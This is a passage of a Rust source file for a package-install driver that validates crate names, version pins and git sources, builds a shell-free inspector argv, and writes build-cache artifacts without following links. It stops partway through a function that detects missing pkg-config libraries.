//! The `ipe add` / `ipe install` / `ipe remove` driver: source gating,
//! cache-artifact management, dynamic manifest lines, and sentinel DCE.
//!
//! Everything that touches an untrusted input is a parse-don't-validate
//! newtype ([`CrateName`], [`GitSource`]) — a value that exists has already
//! passed the gate, so no command-line or network step needs a defensive
//! re-check. There is NO shell anywhere: the inspector invocation is a
//! typed argv the caller hands to the `ipe_sandbox` jail — this crate
//! stays process-capability-free; the CLI composes [`inspector_argv`] +
//! `ipe_sandbox::run_in_bwrap_jail` + [`install_from_inspection`].
//!
//! The CLI owns the interactive trust confirmation; this module supplies
//! the gate, the summary text, and the file-level operations.

use std::collections::BTreeSet;
use std::ffi::OsString;
use std::path::{Path, PathBuf};

use crate::diag::{Diagnostic, SourceDefect};
use crate::naming::{WRAPPER_END_SENTINEL, WRAPPER_SENTINEL_PREFIX};
use crate::pkginfo::{CrateVersion, FeatureName, PackageName, PkgInfo};
use ipe_diagnostics::terminal::TerminalLine;

// ── crate-name gate ─────────────────────────────────────────────────────────

/// A validated crate name (`^[A-Za-z0-9_-]+$`, non-empty) — the only form
/// that can reach an inspector argv.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct CrateName(String);

impl CrateName {
    /// Validate and wrap a crate name.
    ///
    /// # Errors
    ///
    /// `IPE-F4411` when the name is empty or carries a character outside
    /// `[A-Za-z0-9_-]` (a shell metacharacter can never reach an argv).
    pub fn parse(s: &str) -> Result<Self, Diagnostic> {
        let legal = !s.is_empty()
            && s.chars()
                .all(|c| c.is_ascii_alphanumeric() || c == '_' || c == '-');
        if legal {
            Ok(Self(s.to_owned()))
        } else {
            Err(Diagnostic::SourceRejected {
                source: s.to_owned(),
                defect: SourceDefect::CrateNameIllegal,
            })
        }
    }

    /// The validated name.
    #[must_use]
    pub fn as_str(&self) -> &str {
        &self.0
    }
}

/// A validated crate version requirement.
///
/// The only form that can join a `name@version` inspector spec; the charset
/// mirrors the inspector's own semver gate (the value is spliced into a TOML
/// value position there).
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct VersionPin(String);

impl VersionPin {
    /// Validate and wrap a version requirement (e.g. `0.49`, `=1.0.0-rc.6`).
    ///
    /// # Errors
    ///
    /// `IPE-F4411` when the requirement is empty or carries a character
    /// outside `[0-9A-Za-z.*=<>~^,+ -]`.
    pub fn parse(s: &str) -> Result<Self, Diagnostic> {
        let legal = !s.is_empty() && s.chars().all(crate::pkginfo::version_char_is_legal);
        if legal {
            Ok(Self(s.to_owned()))
        } else {
            Err(Diagnostic::SourceRejected {
                source: s.to_owned(),
                defect: SourceDefect::VersionReqIllegal { got: s.to_owned() },
            })
        }
    }

    /// The validated requirement text.
    #[must_use]
    pub fn as_str(&self) -> &str {
        &self.0
    }
}

/// A crate plus an optional version pin, as `ipe add <crate>[@<version>]`
/// accepts (mirrors `cargo add name@version`; a prerelease resolves only
/// through an exact pin).
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct CrateSpec {
    name: CrateName,
    version: Option<VersionPin>,
}

impl CrateSpec {
    /// Parse `name` or `name@version`; both halves go through their gates.
    ///
    /// # Errors
    ///
    /// `IPE-F4411` from whichever half fails its charset gate.
    pub fn parse(s: &str) -> Result<Self, Diagnostic> {
        match s.split_once('@') {
            Some((n, v)) => Ok(Self {
                name: CrateName::parse(n)?,
                version: Some(VersionPin::parse(v)?),
            }),
            None => Ok(Self {
                name: CrateName::parse(s)?,
                version: None,
            }),
        }
    }

    /// Build from already-validated halves (the `ipe install` manifest path).
    #[must_use]
    pub const fn new(name: CrateName, version: Option<VersionPin>) -> Self {
        Self { name, version }
    }

    /// The crate name.
    #[must_use]
    pub const fn name(&self) -> &CrateName {
        &self.name
    }

    /// The single positional inspector argument (`name` or `name@version`).
    #[must_use]
    pub fn inspector_arg(&self) -> String {
        self.version.as_ref().map_or_else(
            || self.name.as_str().to_owned(),
            |v| format!("{}@{}", self.name.as_str(), v.as_str()),
        )
    }
}

// ── git-source gate ─────────────────────────────────────────────────────────

/// The raw pin flags as the CLI collects them, before the gate.
#[derive(Debug, Clone, Default, PartialEq, Eq)]
pub struct RawGitPin {
    /// `--rev` value, when given.
    pub rev: Option<String>,
    /// `--branch` value, when given.
    pub branch: Option<String>,
    /// `--tag` value, when given.
    pub tag: Option<String>,
}

/// A validated git revision pin — at most one of rev/branch/tag.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum GitPin {
    /// `--rev <commit>`.
    Rev(String),
    /// `--branch <name>`.
    Branch(String),
    /// `--tag <name>`.
    Tag(String),
    /// No pin — the repository default branch.
    Default,
}

/// The git hosts a source may name. Defaults to the public forges; the
/// operator extends or replaces it via `IPE_FFI_GIT_HOSTS`.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct HostAllowlist(Vec<String>);

impl Default for HostAllowlist {
    fn default() -> Self {
        Self(vec![
            "github.com".to_owned(),
            "gitlab.com".to_owned(),
            "codeberg.org".to_owned(),
        ])
    }
}

impl HostAllowlist {
    /// Parse a comma-separated override (the `IPE_FFI_GIT_HOSTS` value);
    /// empty/whitespace-only input keeps the default list.
    #[must_use]
    pub fn from_override(raw: &str) -> Self {
        let hosts: Vec<String> = raw
            .split(',')
            .map(str::trim)
            .filter(|h| !h.is_empty())
            .map(str::to_owned)
            .collect();
        if hosts.is_empty() {
            Self::default()
        } else {
            Self(hosts)
        }
    }

    /// The allowlisted hosts.
    #[must_use]
    pub fn hosts(&self) -> &[String] {
        &self.0
    }
}

/// A validated git source. A value of this type is, by existence, https,
/// host-charset-clean, host-allowlisted, and carries at most one pin.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct GitSource {
    url: String,
    host: String,
    pin: GitPin,
}

impl GitSource {
    /// Run the full gate over a raw URL + raw pin flags.
    ///
    /// # Errors
    ///
    /// `IPE-F4411` naming the first broken rule; nothing has touched a
    /// command or the network when this returns.
    pub fn parse(
        raw_url: &str,
        pin: &RawGitPin,
        hosts: &HostAllowlist,
    ) -> Result<Self, Diagnostic> {
        let reject = |defect: SourceDefect| Diagnostic::SourceRejected {
            source: raw_url.to_owned(),
            defect,
        };
        let Some(rest) = raw_url.strip_prefix("https://") else {
            return Err(reject(SourceDefect::SchemeNotHttps));
        };
        let host = rest.split(['/', '?', '#']).next().unwrap_or("").to_owned();
        if host.is_empty() {
            return Err(reject(SourceDefect::HostMissing));
        }
        let host_clean = host
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '_' | '-'));
        if !host_clean {
            return Err(reject(SourceDefect::HostCharsetIllegal { host }));
        }
        if !hosts.0.iter().any(|h| h == &host) {
            return Err(reject(SourceDefect::HostNotAllowlisted {
                host,
                allowed: hosts.0.clone(),
            }));
        }
        if raw_url.chars().any(|c| c.is_whitespace() || c.is_control()) {
            return Err(reject(SourceDefect::HostCharsetIllegal { host }));
        }
        let present: Vec<&'static str> = [
            ("rev", pin.rev.is_some()),
            ("branch", pin.branch.is_some()),
            ("tag", pin.tag.is_some()),
        ]
        .into_iter()
        .filter_map(|(n, set)| set.then_some(n))
        .collect();
        if present.len() > 1 {
            return Err(reject(SourceDefect::MultiplePins { present }));
        }
        let gate_pin = |v: &str| -> Result<String, Diagnostic> {
            let legal = !v.is_empty()
                && !v.starts_with('-')
                && !v.chars().any(|c| c.is_whitespace() || c.is_control());
            if legal {
                Ok(v.to_owned())
            } else {
                Err(reject(SourceDefect::PinIllegal { got: v.to_owned() }))
            }
        };
        let pin = if let Some(r) = &pin.rev {
            GitPin::Rev(gate_pin(r)?)
        } else if let Some(b) = &pin.branch {
            GitPin::Branch(gate_pin(b)?)
        } else if let Some(t) = &pin.tag {
            GitPin::Tag(gate_pin(t)?)
        } else {
            GitPin::Default
        };
        Ok(Self {
            url: raw_url.to_owned(),
            host,
            pin,
        })
    }

    /// The validated URL.
    #[must_use]
    pub fn url(&self) -> &str {
        &self.url
    }

    /// The validated host.
    #[must_use]
    pub fn host(&self) -> &str {
        &self.host
    }

    /// The validated pin.
    #[must_use]
    pub const fn pin(&self) -> &GitPin {
        &self.pin
    }
}

// ── inspector invocation (typed argv, no shell) ─────────────────────────────

/// The inspector argv for one crate. Every element originates from a
/// validated newtype, so the argv is injection-free by construction; the
/// caller wraps it in the `ipe_sandbox` jail.
#[must_use]
pub fn inspector_argv(
    krate: &CrateSpec,
    features: &[String],
    git: Option<&GitSource>,
    allow_build_scripts: bool,
    fetch_only: bool,
) -> Vec<OsString> {
    let mut argv: Vec<OsString> = Vec::new();
    if fetch_only {
        argv.push("--fetch-only".into());
    }
    if allow_build_scripts {
        argv.push("--allow-build-scripts".into());
    }
    if !features.is_empty() {
        argv.push("--features".into());
        argv.push(features.join(",").into());
    }
    if let Some(g) = git {
        argv.push("--git".into());
        argv.push(g.url().into());
        match g.pin() {
            GitPin::Rev(r) => {
                argv.push("--rev".into());
                argv.push(r.into());
            }
            GitPin::Branch(b) => {
                argv.push("--branch".into());
                argv.push(b.into());
            }
            GitPin::Tag(t) => {
                argv.push("--tag".into());
                argv.push(t.into());
            }
            GitPin::Default => {}
        }
    }
    argv.push(krate.inspector_arg().into());
    argv
}

/// The trust-decision summary printed BEFORE any fetch: what will be
/// compiled, from where, and how much of it.
#[must_use]
pub fn trust_summary(
    krate: &CrateName,
    version: &str,
    git: Option<&GitSource>,
    transitive_count: usize,
) -> String {
    use std::fmt::Write;
    let mut out = format!(
        "About to fetch and COMPILE untrusted code:\n  crate:      {}\n",
        krate.as_str()
    );
    // Writing into a String is infallible.
    if !version.is_empty() {
        let _ = writeln!(out, "  version:    {version}");
    }
    if let Some(g) = git {
        let _ = writeln!(out, "  git source: {}", g.url());
    }
    let _ = write!(
        out,
        "  transitive dependencies to compile: {transitive_count}\n\
         Compiling runs the crate's build scripts and proc-macros (inside the\n\
         isolation jail). Continue?"
    );
    out
}

// ── project-local cache ─────────────────────────────────────────────────────

/// The filesystem slug for a crate's cache artifacts.
#[must_use]
pub fn slugify(name: &str) -> String {
    name.chars()
        .map(|c| {
            if c.is_ascii_alphanumeric() {
                c.to_ascii_lowercase()
            } else {
                '_'
            }
        })
        .collect()
}

/// The suffix that marks a cache entry as one installed crate's consumer manifest.
const CONSUMER_SUFFIX: &str = ".consumer.json";

/// The artifact file names for one bound crate, relative to the cache directory.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ArtifactNames {
    /// The `.ipei` type-environment seed.
    pub ipei: String,
    /// The `kernel.json` call registry.
    pub kernel_json: String,
    /// The `_bindings.rs` wrapper module.
    pub bindings: String,
    /// The `coverage.md` over-drop report.
    pub coverage: String,
    /// The injectable Ipê interface module.
    pub interface: String,
    /// The consumer manifest.
    pub consumer: String,
    /// The validated inspection document.
    pub pkg_json: String,
}

impl ArtifactNames {
    /// The artifact file names for `slug`.
    #[must_use]
    pub fn for_slug(slug: &str) -> Self {
        Self {
            ipei: format!("{slug}.ipei"),
            kernel_json: format!("{slug}.kernel.json"),
            bindings: format!("{slug}_bindings.rs"),
            coverage: format!("{slug}.coverage.md"),
            interface: format!("{slug}.ipe"),
            consumer: format!("{slug}{CONSUMER_SUFFIX}"),
            pkg_json: format!("{slug}.pkg.json"),
        }
    }
}

/// The artifact paths for one bound crate.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ArtifactPaths {
    /// The `.ipei` type-environment seed.
    pub ipei: PathBuf,
    /// The `kernel.json` call registry.
    pub kernel_json: PathBuf,
    /// The `_bindings.rs` wrapper module.
    pub bindings: PathBuf,
    /// The `coverage.md` over-drop report.
    pub coverage: PathBuf,
    /// The injectable Ipê interface module (`<slug>.ipe`).
    pub interface: PathBuf,
    /// The consumer manifest (`<slug>.consumer.json`) — module/kernel names,
    /// opaque-type paths, pinned Cargo dep lines, and the included bindings.
    pub consumer: PathBuf,
    /// The validated inspection document (`<slug>.pkg.json`) — the raw
    /// inspector wire JSON that decoded through the [`PkgInfo`] gate. The
    /// TRUSTED source `load_catalog_from` re-derives `_bindings.rs` from: the
    /// stored `_bindings.rs` text is never trusted, only regenerated.
    pub pkg_json: PathBuf,
}

/// The per-project namespace directory ipe keeps its caches in.
pub const CACHE_NAMESPACE_DIR: &str = ".ipe";

/// The build-cache entry inside [`CACHE_NAMESPACE_DIR`].
pub const CACHE_SUBDIR: &str = "cache";

/// The FFI artifact cache directory, component by component, relative to its project root.
pub const FFI_CACHE_COMPONENTS: [&str; 4] = [CACHE_NAMESPACE_DIR, CACHE_SUBDIR, "ffi", "rust"];

/// The FFI artifact cache directory, relative to its project root, as text.
///
/// It is [`FFI_CACHE_COMPONENTS`] joined by `/`; the build fails if the two drift.
/// A path is always built from the components, never from this text: below a
/// Windows verbatim root `/` is no separator, so the text would name one entry.
pub const FFI_CACHE_REL: &str = ".ipe/cache/ffi/rust";

/// Permission bits of each FFI cache directory [`FfiCache::write_package`] creates on Unix: its owner's only.
///
/// The cache's bindings compile unsandboxed into the consumer crate, so no
/// other user may list, plant, or replace an entry in it.
pub const PRIVATE_DIR_MODE: u32 = 0o700;

/// Permission bits of each FFI cache artifact [`FfiCache::write_package`] writes on Unix: its owner's only.
pub const PRIVATE_FILE_MODE: u32 = 0o600;

/// The FFI cache directory, reached level by level beneath its project root, never through a link.
///
/// Every write and removal goes through it, so a link planted at a cache level
/// (a cloned repository can commit one) never redirects an artifact outside
/// the project; on Unix no later path lookup can be swapped either, since each
/// level is opened through the handle on the level above it.
struct CacheDir {
    /// The held handle on the cache directory.
    #[cfg(unix)]
    dir: std::fs::File,
    /// The cache directory, checked level by level without following a link.
    #[cfg(not(unix))]
    dir: PathBuf,
}

/// Why a cache level could not be reached: the level and the cause.
struct LevelError {
    path: PathBuf,
    source: std::io::Error,
}

/// The name of a fresh temporary sibling of the entry `name`, unique to this call within this process.
fn temp_name(name: &str) -> String {
    use std::sync::atomic::{AtomicU64, Ordering};
    static NEXT_TEMP: AtomicU64 = AtomicU64::new(0);
    format!(
        "{name}.{}.{}.tmp",
        std::process::id(),
        NEXT_TEMP.fetch_add(1, Ordering::Relaxed)
    )
}

/// Create the directory at `project_root` and any absent parent, owner-only on Unix.
///
/// The root is the anchor its caller named, so it is reached as named; only the
/// cache levels beneath it are opened without following a link.
fn create_project_root(project_root: &Path) -> Result<(), LevelError> {
    let mut builder = std::fs::DirBuilder::new();
    builder.recursive(true);
    #[cfg(unix)]
    std::os::unix::fs::DirBuilderExt::mode(&mut builder, PRIVATE_DIR_MODE);
    builder.create(project_root).map_err(|source| LevelError {
        path: project_root.to_path_buf(),
        source,
    })
}

#[cfg(unix)]
impl CacheDir {
    /// Flags for opening one directory level.
    fn dir_flags() -> rustix::fs::OFlags {
        use rustix::fs::OFlags;
        OFlags::RDONLY | OFlags::DIRECTORY | OFlags::CLOEXEC
    }

    /// The cache beneath the directory at `project_root`; `None` when a level is absent and `create` is off.
    ///
    /// `project_root` itself is created (when `create`) and opened as named; each of
    /// [`FFI_CACHE_COMPONENTS`] is opened beneath its parent's handle without
    /// following a link, and created owner-only first when absent and `create`.
    /// A level that already exists keeps its mode; the loader's owner rule judges it.
    fn open(project_root: &Path, create: bool) -> Result<Option<Self>, LevelError> {
        use rustix::fs::{CWD, Mode, OFlags};
        use rustix::io::Errno;
        let fail = |path: &Path, e: Errno| LevelError {
            path: path.to_path_buf(),
            source: e.into(),
        };
        if create {
            create_project_root(project_root)?;
        }
        let mut level =
            match rustix::fs::openat(CWD, project_root, Self::dir_flags(), Mode::empty()) {
                Ok(fd) => std::fs::File::from(fd),
                Err(e) if e == Errno::NOENT && !create => return Ok(None),
                Err(e) => return Err(fail(project_root, e)),
            };
        let mut shown = project_root.to_path_buf();
        let flags = Self::dir_flags() | OFlags::NOFOLLOW;
        for name in FFI_CACHE_COMPONENTS {
            shown.push(name);
            match rustix::fs::openat(&level, name, flags, Mode::empty()) {
                Ok(fd) => {
                    level = std::fs::File::from(fd);
                    continue;
                }
                Err(e) if e == Errno::NOENT && create => {}
                Err(e) if e == Errno::NOENT => return Ok(None),
                Err(e) => return Err(fail(&shown, e)),
            }
            match rustix::fs::mkdirat(&level, name, Mode::RWXU) {
                Ok(()) => {}
                Err(e) if e == Errno::EXIST => {}
                Err(e) => return Err(fail(&shown, e)),
            }
            level = rustix::fs::openat(&level, name, flags, Mode::empty())
                .map(std::fs::File::from)
                .map_err(|e| fail(&shown, e))?;
        }
        Ok(Some(Self { dir: level }))
    }

    /// Replace the entry `name` with a new owner-only file holding `contents`.
    ///
    /// The bytes go to a temporary sibling ([`temp_name`]) created exclusively
    /// and never through a link; a rename then replaces the entry `name`
    /// itself, so a link planted there is replaced, never written through, and
    /// an existing artifact never keeps a wider mode than [`PRIVATE_FILE_MODE`].
    fn replace(&self, name: &str, contents: &str) -> std::io::Result<()> {
        use std::io::Write as _;

        use rustix::fs::{AtFlags, Mode, OFlags};
        use rustix::io::Errno;
        let temp = temp_name(name);
        let flags =
            OFlags::WRONLY | OFlags::CREATE | OFlags::EXCL | OFlags::NOFOLLOW | OFlags::CLOEXEC;
        let mode = Mode::RUSR | Mode::WUSR;
        let fd = match rustix::fs::openat(&self.dir, temp.as_str(), flags, mode) {
            Ok(fd) => fd,
            // Left by a dead process that ran under this pid: the name is this call's alone.
            Err(e) if e == Errno::EXIST => {
                rustix::fs::unlinkat(&self.dir, temp.as_str(), AtFlags::empty())?;
                rustix::fs::openat(&self.dir, temp.as_str(), flags, mode)?
            }
            Err(e) => return Err(e.into()),
        };
        let written = std::fs::File::from(fd)
            .write_all(contents.as_bytes())
            .and_then(|()| {
                rustix::fs::renameat(&self.dir, temp.as_str(), &self.dir, name).map_err(Into::into)
            });
        if written.is_err() {
            let _ = rustix::fs::unlinkat(&self.dir, temp.as_str(), AtFlags::empty());
        }
        written
    }

    /// Remove the entry `name`, never through a link; an absent entry is fine.
    fn remove(&self, name: &str) -> std::io::Result<()> {
        use rustix::io::Errno;
        match rustix::fs::unlinkat(&self.dir, name, rustix::fs::AtFlags::empty()) {
            Ok(()) => Ok(()),
            Err(e) if e == Errno::NOENT => Ok(()),
            Err(e) => Err(e.into()),
        }
    }
}

#[cfg(not(unix))]
impl CacheDir {
    /// The cache beneath `project_root`; `None` when a level is absent and `create` is off.
    ///
    /// Each level is inspected without following a link, and created first
    /// when absent and `create`; a link (a Windows junction included) or a
    /// level that is not a directory is refused.
    fn open(project_root: &Path, create: bool) -> Result<Option<Self>, LevelError> {
        use std::io::ErrorKind;
        if create {
            create_project_root(project_root)?;
        }
        let mut level = project_root.to_path_buf();
        for name in FFI_CACHE_COMPONENTS {
            level.push(name);
            let fail = |source: std::io::Error| LevelError {
                path: level.clone(),
                source,
            };
            match std::fs::symlink_metadata(&level) {
                Ok(_) => {}
                Err(e) if e.kind() == ErrorKind::NotFound && create => {
                    match std::fs::create_dir(&level) {
                        Ok(()) => {}
                        Err(e) if e.kind() == ErrorKind::AlreadyExists => {}
                        Err(e) => return Err(fail(e)),
                    }
                }
                Err(e) if e.kind() == ErrorKind::NotFound => return Ok(None),
                Err(e) => return Err(fail(e)),
            }
            let meta = std::fs::symlink_metadata(&level).map_err(fail)?;
            if !meta.file_type().is_dir() {
                return Err(fail(ErrorKind::NotADirectory.into()));
            }
        }
        Ok(Some(Self { dir: level }))
    }

    /// Replace the entry `name` with a new file holding `contents`, through a temporary sibling and a rename.
    fn replace(&self, name: &str, contents: &str) -> std::io::Result<()> {
        use std::io::Write as _;
        let temp = self.dir.join(temp_name(name));
        let mut file = std::fs::OpenOptions::new()
            .write(true)
            .create_new(true)
            .open(&temp)?;
        let written = file
            .write_all(contents.as_bytes())
            .and_then(|()| std::fs::rename(&temp, self.dir.join(name)));
        if written.is_err() {
            let _ = std::fs::remove_file(&temp);
        }
        written
    }

    /// Remove the entry `name`; an absent entry is fine.
    fn remove(&self, name: &str) -> std::io::Result<()> {
        match std::fs::remove_file(self.dir.join(name)) {
            Ok(()) => Ok(()),
            Err(e) if e.kind() == std::io::ErrorKind::NotFound => Ok(()),
            Err(e) => Err(e),
        }
    }
}

/// The FFI cache path relative to its project root, built one component at a time.
fn cache_rel() -> PathBuf {
    FFI_CACHE_COMPONENTS.iter().collect()
}

// IPE-RUST-AUDIT:ACCEPTED (Arthur Maciel) — compile-time `const` assertion (not a runtime panic); fails the BUILD if the FFI cache path and its components drift apart [ledger #boundary]
const _: () = assert!(rel_joins(FFI_CACHE_REL, &FFI_CACHE_COMPONENTS));

/// Whether `rel` is exactly `components` joined by `/`, each one non-empty and free of `/`.
///
/// One pass over the bytes of `rel`, consuming each component in turn.
const fn rel_joins(rel: &str, components: &[&str]) -> bool {
    let mut rest = rel.as_bytes();
    let mut parts = components;
    let mut first = true;
    while let [part, tail @ ..] = parts {
        if !first {
            match rest {
                [b'/', after @ ..] => rest = after,
                _ => return false,
            }
        }
        first = false;
        let mut name = part.as_bytes();
        if name.is_empty() {
            return false;
        }
        while let [want, name_tail @ ..] = name {
            match rest {
                [got, after @ ..] if *got == *want && *want != b'/' => rest = after,
                _ => return false,
            }
            name = name_tail;
        }
        parts = tail;
    }
    rest.is_empty() && !first
}

/// The project-local FFI artifact cache (`<project>/.ipe/cache/ffi/rust`).
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct FfiCache {
    root: PathBuf,
}

impl FfiCache {
    /// The cache under a project root.
    #[must_use]
    pub fn at_project_root(project_root: &Path) -> Self {
        Self {
            root: project_root.join(cache_rel()),
        }
    }

    /// The cache directory itself.
    #[must_use]
    pub fn root(&self) -> &Path {
        &self.root
    }

    /// The project root this cache is anchored under — the jail every
    /// wrapper crate must resolve inside.
    ///
    /// # Errors
    ///
    /// [`Diagnostic::WireMalformed`] carrying
    /// [`crate::diag::WireDefect::CacheRootUnanchored`] when the cache is not
    /// at `<project>/.ipe/cache/ffi/rust`.
    pub fn project_root(&self) -> Result<&Path, Diagnostic> {
        let unanchored = || Diagnostic::WireMalformed {
            context: "FFI cache".to_owned(),
            defect: crate::diag::WireDefect::CacheRootUnanchored {
                got: self.root.to_string_lossy().into_owned(),
            },
        };
        if !self.root.ends_with(cache_rel()) {
            return Err(unanchored());
        }
        let depth = FFI_CACHE_COMPONENTS.len();
        let root = self.root.ancestors().nth(depth).ok_or_else(unanchored)?;
        Ok(if root.as_os_str().is_empty() {
            Path::new(".")
        } else {
            root
        })
    }

    /// The artifact paths for a slug.
    #[must_use]
    pub fn artifact_paths(&self, slug: &str) -> ArtifactPaths {
        let names = ArtifactNames::for_slug(slug);
        ArtifactPaths {
            ipei: self.root.join(names.ipei),
            kernel_json: self.root.join(names.kernel_json),
            bindings: self.root.join(names.bindings),
            coverage: self.root.join(names.coverage),
            interface: self.root.join(names.interface),
            consumer: self.root.join(names.consumer),
            pkg_json: self.root.join(names.pkg_json),
        }
    }

    /// Emit and write all artifacts for a validated package. `inspection_json`
    /// is the raw inspector wire text that decoded into `pkg`; it is persisted
    /// as `<slug>.pkg.json`, the sole source `load_catalog_from` re-derives the
    /// whole consumer-side view from through the validated decode gate. The
    /// other six artifacts are debug/watch projections the loader never
    /// trusts.
    ///
    /// Each level of the cache is opened, or created owner-only, beneath the
    /// project root without following a link (see [`CacheDir`]).
    ///
    /// # Errors
    ///
    /// `IPE-F4412` naming a cache level that is a link or not a directory, or
    /// the first path that could not be written; a wire-defect diagnostic when
    /// the cache is not anchored at a project root.
    pub fn write_package(
        &self,
        pkg: &PkgInfo,
        inspection_json: &str,
    ) -> Result<ArtifactPaths, Diagnostic> {
        let io_err = |path: &Path, e: &std::io::Error| Diagnostic::ArtifactIo {
            path: path.to_string_lossy().into_owned(),
            detail: e.to_string(),
        };
        let level_err = |e: LevelError| io_err(&e.path, &e.source);
        let dir = CacheDir::open(self.project_root()?, true)
            .map_err(level_err)?
            .ok_or_else(|| io_err(&self.root, &std::io::ErrorKind::NotFound.into()))?;
        let slug = slugify(pkg.name());
        let names = ArtifactNames::for_slug(&slug);
        let paths = self.artifact_paths(&slug);
        let iface = crate::interface::crate_interface(pkg);
        let consumer_json = emit_consumer_json(pkg, &iface, self)?;
        let writes: [(&str, &Path, String); 7] = [
            (
                &names.ipei,
                &paths.ipei,
                crate::emit::emit_ipei(pkg, &iface.transparent_types),
            ),
            (
                &names.kernel_json,
                &paths.kernel_json,
                crate::emit::emit_kernel_json(pkg),
            ),
            (
                &names.bindings,
                &paths.bindings,
                crate::bindings::emit_bindings(pkg),
            ),
            (
                &names.coverage,
                &paths.coverage,
                emit_coverage(pkg, &iface.skipped),
            ),
            (&names.interface, &paths.interface, iface.source),
            (&names.consumer, &paths.consumer, consumer_json),
            (&names.pkg_json, &paths.pkg_json, inspection_json.to_owned()),
        ];
        for (name, path, contents) in &writes {
            dir.replace(name, contents).map_err(|e| io_err(path, &e))?;
        }
        Ok(paths)
    }

    /// Delete a slug's artifacts (`ipe rust remove`), never through a link.
    /// Already-absent files, or an absent cache, are fine — removal is
    /// idempotent.
    ///
    /// # Errors
    ///
    /// `IPE-F4412` naming a cache level that is a link or not a directory, or
    /// the first artifact that exists but cannot be deleted; a wire-defect
    /// diagnostic when the cache is not anchored at a project root.
    pub fn remove_package(&self, slug: &str) -> Result<(), Diagnostic> {
        let io_err = |path: &Path, e: &std::io::Error| Diagnostic::ArtifactIo {
            path: path.to_string_lossy().into_owned(),
            detail: e.to_string(),
        };
        let Some(dir) =
            CacheDir::open(self.project_root()?, false).map_err(|e| io_err(&e.path, &e.source))?
        else {
            return Ok(());
        };
        let names = ArtifactNames::for_slug(slug);
        let paths = self.artifact_paths(slug);
        for (name, path) in [
            (&names.ipei, &paths.ipei),
            (&names.kernel_json, &paths.kernel_json),
            (&names.bindings, &paths.bindings),
            (&names.coverage, &paths.coverage),
            (&names.interface, &paths.interface),
            (&names.consumer, &paths.consumer),
            (&names.pkg_json, &paths.pkg_json),
        ] {
            dir.remove(name).map_err(|e| io_err(path, &e))?;
        }
        Ok(())
    }
}

// ── pkg-config missing-library detection ────────────────────────────────────

/// The longest `pkg-config` library name [`SysLibName::parse`] accepts.
pub const SYS_LIB_NAME_MAX_LEN: usize = 128;

/// A `pkg-config` library name in the `pkg-config` charset, safe to place in a suggested shell command.
///
/// ASCII letters, digits, and `.`, `_`, `+`, `-`, opening with a letter or
/// digit (so it never reads as a command-line option), at most
/// [`SYS_LIB_NAME_MAX_LEN`] bytes. The name is scraped from untrusted
/// build-script output and lands inside an `apt install …` line the user may
/// copy and run; a value that holds a shell metacharacter or whitespace has no
/// representation, so no install hint can carry one.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct SysLibName(String);

impl SysLibName {
    /// Parse `raw`, or `None` when it falls outside the `pkg-config` charset or length bound.
    #[must_use]
    pub fn parse(raw: &str) -> Option<Self> {
        let opens_with_alphanumeric = raw
            .chars()
            .next()
            .is_some_and(|c| c.is_ascii_alphanumeric());
        let legal = opens_with_alphanumeric
            && raw.len() <= SYS_LIB_NAME_MAX_LEN
            && raw
                .chars()
                .all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '_' | '+' | '-'));
        legal.then(|| Self(raw.to_owned()))
    }

    /// The parsed name.
    #[must_use]
    pub fn as_str(&self) -> &str {
        &self.0
    }
}

/// A parsed pkg-config "not found" failure: the missing system library and
/// the Rust crate whose build script reported it.
///
/// Parse-don't-validate: callers receive a typed value, never a raw string.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct MissingSystemLib {
    /// The `pkg-config` library name (e.g. `wayland-client`).
    pub system_lib: SysLibName,
    /// The Rust `-sys` crate that required it (e.g. `wayland-sys`), when the
    /// failure named one that parses as a crate name.
    pub crate_name: Option<CrateName>,
}

/// Trim and strip control characters from a name extracted out of raw build-script stderr.
///
/// An ANSI escape or other control byte carried in the raw stderr is removed
/// before the name is parsed, so the parse sees the characters a terminal
/// would show.
fn sanitize_extracted_name(raw: &str) -> String {
    TerminalLine::sanitize(raw.trim()).as_str().to_string()
}

/// Parse a missing-library failure's two names, or `None` when the library name does not parse.
fn missing_system_lib(sys_lib: &str, crate_name: Option<&str>) -> Option<MissingSystemLib> {
    Some(MissingSystemLib {
        system_lib: SysLibName::parse(&sanitize_extracted_name(sys_lib))?,
        crate_name: crate_name
            .and_then(|name| CrateName::parse(&sanitize_extracted_name(name)).ok()),
    })
}

/// The raw inspector error channel from an inspection document, best-effort.
///
/// The `--verbose` escape hatch behind the summarised [`Diagnostic`]. A document
/// that does not decode yields no lines rather than an error — verbose output is
/// advisory, never a second failure path.
#[must_use]
pub fn inspection_error_log(inspection_json: &str) -> Vec<String> {
    PkgInfo::decode_json(inspection_json).map_or_else(|_| Vec::new(), |pkg| pkg.errors().to_vec())
}

/// Scan the inspector's captured error strings for the pkg-config
/// "not found" signature and return the first match as a [`MissingSystemLib`].
///
/// Recognises two forms that appear in cargo/build-script stderr:
///
/// - The system library `<lib>` required by crate `<crate>` was not found.
/// - Package `<lib>` was not found (or not found in the pkg-config search path)
///
/// Returns `None` when no pkg-config signature is present (the failure has a
/// different cause), or when the named library does not parse as a
/// [`SysLibName`]: such a failure is summarised like any other, with no
/// install hint.
#[must_use]
pub fn detect_missing_system_lib(errors: &[String]) -> Option<MissingSystemLib> {
    for line in errors {
        // Primary form emitted by `pkg_config` crate build scripts:
        // "The system library `<lib>` required by crate `<crate>` was not found."
        if let Some(rest) = line.strip_prefix("The system library `")
            && let Some((sys_lib, rest)) = rest.split_once("` required by crate `")
            && let Some((crate_name, _)) = rest.split_once("` was not found")
        {
            return missing_system_lib(sys_lib, Some(crate_name));
        }
        // Secondary form from pkg-config itself:
        // "Package '<lib>' was not found in the pkg-config search path."
        // or "Package '<lib>', required by 'virtual:world', not found"
        if (line.contains("was not found in the pkg-config search path")
            || (line.contains("not found") && line.starts_with("Package '")))
            && let Some(rest) = line.strip_prefix("Package '")
            && let Some((sys_lib, _)) = rest.split_once('\'')
        {
